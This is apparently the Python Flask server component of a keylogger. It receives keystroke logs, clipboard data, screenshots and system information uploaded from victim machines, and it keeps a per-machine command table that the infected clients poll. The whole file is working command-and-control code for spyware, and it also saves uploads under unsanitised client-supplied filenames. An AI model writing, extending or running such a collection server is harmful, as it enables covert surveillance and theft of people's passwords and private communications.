from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy
import os

app = Flask(__name__)

# Configuration
UPLOAD_FOLDER = 'C:\\Users\\USER\\Documents\\GitHub\\Keylogger\\Server\\upload'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///commands.db'  # SQLite database for storing commands
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Initialize the database
db = SQLAlchemy(app)


# Database model for storing commands
class MachineCommand(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    machine_id = db.Column(db.String(100), unique=True, nullable=False)
    command = db.Column(db.String(100), nullable=False, default='RUN')  # Default command: 'RUN'

    def __init__(self, machine_id, command):
        self.machine_id = machine_id
        self.command = command


# Create the database and initialize tables
with app.app_context():
    db.create_all()


@app.route('/command/<machine_id>', methods=['GET', 'POST'])
def handle_command(machine_id):
    """Handles GET and POST requests for managing machine-specific commands."""
    try:
        # POST request: Set a new command for the machine
        if request.method == 'POST':
            data = request.get_json() or {}
            command = data.get('command', 'RUN')  # Default to 'RUN' if no command is provided

            # Find the machine in the database or create a new entry
            machine_entry = MachineCommand.query.filter_by(machine_id=machine_id).first()
            if machine_entry:
                machine_entry.command = command  # Update the command
            else:
                machine_entry = MachineCommand(machine_id=machine_id, command=command)
                db.session.add(machine_entry)

            db.session.commit()
            return jsonify({'status': 'success', 'message': f'Command updated to: {command}'})

        # GET request: Retrieve the current command for the machine
        elif request.method == 'GET':
            # Get the command from the database
            machine_entry = MachineCommand.query.filter_by(machine_id=machine_id).first()
            if machine_entry:
                return jsonify({'current_command': machine_entry.command})
            else:
                return jsonify({'current_command': 'RUN'})  # Default command: 'RUN'

    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/upload', methods=['POST'])
def upload_file():
    """Handle file uploads for different file types."""
    try:
        machine_id = request.form['machine_id']
        file_type = request.form['file_type']
        if 'file' not in request.files:
            return 'No file part', 400
        file = request.files['file']
        if file.filename == '':
            return 'No selected file', 400
        if file:
            machine_folder = os.path.join(app.config['UPLOAD_FOLDER'], machine_id)
            os.makedirs(machine_folder, exist_ok=True)

            file_path = os.path.join(machine_folder, file.filename)

            # Handle system information separately
            if file_type == 'system':
                if not os.path.exists(file_path):
                    file.save(file_path)
                return 'System info uploaded', 200
            elif file_type in ['keylog', 'clipboard']:
                # Append to existing file or create new
                with open(file_path, 'ab') as f:
                    f.write(file.read())
                return 'Data appended successfully', 200
            elif file_type == 'screenshot':
                # Save screenshot with unique names
                file.save(file_path)
                return 'Screenshot uploaded successfully', 200

        return 'File successfully uploaded', 200

    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, threaded=True)
